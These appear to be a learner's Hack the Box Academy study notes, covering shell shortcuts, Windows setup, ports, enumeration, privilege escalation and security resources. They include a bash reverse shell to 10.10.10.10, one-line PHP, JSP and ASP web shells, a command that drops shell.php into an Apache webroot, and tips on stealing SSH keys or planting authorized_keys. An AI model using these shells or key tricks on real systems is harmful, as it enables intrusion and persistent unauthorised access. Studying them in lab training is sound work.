# Hack the Box Academy

# Learning Process
## Learning Efficiency
- Find out the information you need by asking two questions:
    - What do we alreayd know?
    - What don't we know yet?

# Intro to Linux
- remember `env | grep mail` can print all environment variables and filter for a specific value

Cursor Movement

`[CTRL]` + `A` - Move the cursor to the beginning of the current line.

`[CTRL]` + `E` - Move the cursor to the end of the current line.

`[CTRL]` + `[←]` / `[→]` - Jump at the beginning of the current/previous word.

`[ALT]` + `B` / `F` - Jump backward/forward one word.
Erase The Current Line

`[CTRL]` + `U` - Erase everything from the current position of the cursor to the beginning of the line.

`[Ctrl]` + `K` - Erase everything from the current position of the cursor to the end of the line.

`[Ctrl]` + `W` - Erase the word preceding the cursor position.
Paste Erased Contents

`[Ctrl]` + `Y` - Pastes the erased text or word.
Ends Task

`[CTRL]` + `C` - Ends the current task/process by sending the SIGINT signal. For example, this can be a scan that is running by a tool. If we are watching the scan, we can stop it / kill this process by using this shortcut. While not configured and developed by the tool we are using. The process will be killed without asking us for confirmation.
End-of-File (EOF)

`[CTRL]` + `D` - Close STDIN pipe that is also known as End-of-File (EOF) or End-of-Transmission.
Clear Terminal

`[CTRL]` + `L` - Clears the terminal. An alternative to this shortcut is the clear command you can type to clear our terminal.
Background a Process

`[CTRL]` + `Z` - Suspend the current process by sending the SIGTSTP signal.
Search Through Command History

`[CTRL]` + `R` - Search through command history for commands we typed previously that match our search patterns.

`[↑]` / `[↓]` - Go to the previous/next command in the command history.
Switch Between Applications

`[ALT]` + `[TAB]` - Switch between opened applications.
Zoom

`[CTRL]` + `[+]` - Zoom in.

`[CTRL]` + `[-]` - Zoom out.

# Getting Started - Windows
- `Get-ExecutionPolicy -List` - check system Execution Policy - validate you can download, load, and run modules/scripts
  - Can edit/change the policy for the scope of the process (i.e. current Powershell process)
- `Set-ExecutionPolicy Unrestricted -Scope Process`
- Install the `PSWindowsUpdate` with `Install-Module PSWindowsUpdate`
- Update with `Install-WindowsUpdate -AcceptAll`

## Defender Exemptions
- `C:\Users\Username\`
  - `\Documents\`
    - `git-repos`
    - `scripts`
  - `\AppData\Local\Temp\Chocolatey`
- Add exemption/exclusion with `Add-MpPreference -ExclusionPath "C:\directory\here`

Tools to install older versions of Windows
- https://community.chocolatey.org/
- https://gist.github.com/AveYo/c74dc774a8fb81a332b5d65613187b15
- https://www.heidoc.net/joomla/technology-science/microsoft/67-microsoft-windows-and-office-iso-download-tool%EF%BB%BF
- https://rufus.ie/en_US/

# Getting Started w/ HTB

|Port(s) |	Protocol|
|--------|----------|
|20/21 (TCP) |	FTP|
|22 (TCP) |	SSH|
|23 (TCP) |	Telnet|
|25 (TCP) |	SMTP|
|80 (TCP) |	HTTP|
|161 (TCP/UDP) |	SNMP|
|389 (TCP/UDP) |	LDAP|
|443 (TCP) 	|SSL/TLS (HTTPS)|
|445 (TCP) 	| SMB|
|3389 (TCP) |	RDP|

- Common Ports: https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html
- https://packetlife.net/media/library/23/common-ports.pdf
- Top 1000 by nmap: https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/

## Service Scanning
### SNMP
- Access to SNMP (v1 and 2c) is controlled using a plaintext community string
  - Examination of process parameters might reveal credentials passed on the command line

## Web Enum
- Tools to remember
  - `gobuster`
  - `whatweb`
  - `curl` for banner grabbing
## Web Shells
### Reverse Shells
- Reverse Shell Cheat Sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- Payload All the Things Github: https://github.com/swisskyrepo/PayloadsAllTheThings
- PATT GitHub Lots of HElpful Cheat Sheets: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
  - One not included: `bash -c 'bash -i >& /dev/TCP/10.10.10.10/1234 0>&1'`

### Bind Shells
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md

### Upgrading TTY
- Upgrading TTY = move cursor left/right, edit commands, access command history (up/down arrows)
- Achieved by mapping the terminal TTY with remote TTY

1. Netcat Shell: `Rich@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'`
2. Type `CTRL`+`Z` to background shell
3. Regular Local Terminal: 
  - `stty raw -echo`
  - `fg`
  - `[Enter]`
  - `[Enter]`


If shell doesn't cover entire terminal:
- Separate/new local terminal window: 
  - `echo $TERM`
  - `stty size`
- Back in netcat connection:
  - `www-data@remotehost$ export TERM=xterm-256color`
  - `www-data@remotehost$ stty rows 67 columns 318`

### Web Shells
Code: `php`

`<?PHP system($_GET['cmd']);?>`

Code: `jsp`

`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`

Code: `asp`

`<% eval request("cmd") %>`


|Web Server |	Default Webroot|
|---|---|
|Apache |	/var/www/html/ |
|Nginx |	/usr/local/nginx/html/ |
|IIS |	c:\inetpub\wwwroot\ |
|XAMPP |	C:\xampp\htdocs\ |

- Attacking a Linux host running Apache, with PHP:
  - `echo "<?PHP system(\$_GET['cmd']);?>" > /var/www/html/shell.php`
  - Then visit the `shell.php` page, and use `?cmd=[cmd_here]` to execute commands
  - Alternatively can `curl`

## Priv Esc
### Resources:
Privilege Escalation Checklists:
- [HackTricks](https://book.hacktricks.xyz/)
  - [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
  - [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
  - [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
  - [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [LOLBAS](https://lolbas-project.github.io/#) - similar to GTFOBins, but for Windows

Enumeration Scripts:
- Linux
  - [Linenum](https://github.com/rebootuser/LinEnum.git)
  - [Linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
- Windows
  - [Seatbelt](https://github.com/GhostPack/Seatbelt)
  - [JAWS](https://github.com/411Hall/JAWS)
- [Priv Esc Awesome Scripts SUITE - PEASS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
- Use `dpkg -l` and look at `C:\Program Files\` for software installed

### Scheduled Tasks
- If we can **write to a directory called by a cron job** - can write a bash script with a reverse shell command, which sends a reverse shell when executed

### SSH Keys
- If we have read access over the `.ssh` directory, can read the private key in `/home/user/.ssh/id_rsa/` or `/root/.ssh/id_rsa` (file: `id_rsa` = private key)
- Then use `ssh user@IP_ADDR -i id_rsa`
- If we have write access over `/.ssh/`, then place our public key in the user's `.ssh/authorized_keys` dir
  - Used to gain ssh access after gaining a shell as that user
  - generate key on local host, then copy `key.pub` to the remote machine
  - Write to `authorized_keys` file by using `echo` and appending

## Transferring Files
- Use the `-o filename` flag with `curl` to send output to file
- Use `base64` to encode the file, and copy/paste the string
  - use `-w 0` to disable line wrapping

# Resources
## Videos
|Resource | Description|
| ---| ---|
|[IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA") | Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques.|
|[VbScrub](https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ")|Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.|
[STÖK](https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg"|Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.|
|[LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w")|Provides videos on a wide variety of technical infosec topics.|

## Blogs
- [0xdf hacks Stuff](https://0xdf.gitlab.io/) - walkthroughs of HTB, write-ups on recent exploits/attacks, aD Exploitation techniques, CTF event write-ups, bug bounty report write ups.

## HTB Challenges & Boxes

<p>There are many beginner-friendly machines on the main HTB platform. Some recommended ones are:</p>
<table>
<thead>
<tr>
<th><a href="https://www.hackthebox.eu/home/machines/profile/1">Lame</a></th>
<th><a href="https://www.hackthebox.eu/home/machines/profile/51">Blue</a></th>
<th><a href="https://www.hackthebox.eu/home/machines/profile/121">Nibbles</a></th>
<th><a href="https://www.hackthebox.eu/home/machines/profile/108">Shocker</a></th>
<th><a href="https://www.hackthebox.eu/home/machines/profile/144">Jerry</a></th>

Challenges
th><a href="https://www.hackthebox.eu/home/challenges/Reversing?name=Find%20The%20Easy%20Pass">Find The Easy Pass</a></th>
<th><a href="https://www.hackthebox.eu/home/challenges/Crypto?name=Weak%20RSA">Weak RSA</a></th>
<th><a href="https://www.hackthebox.eu/home/challenges/Pwn?name=You%20know%200xDiablos">You know 0xDiablos</a></th>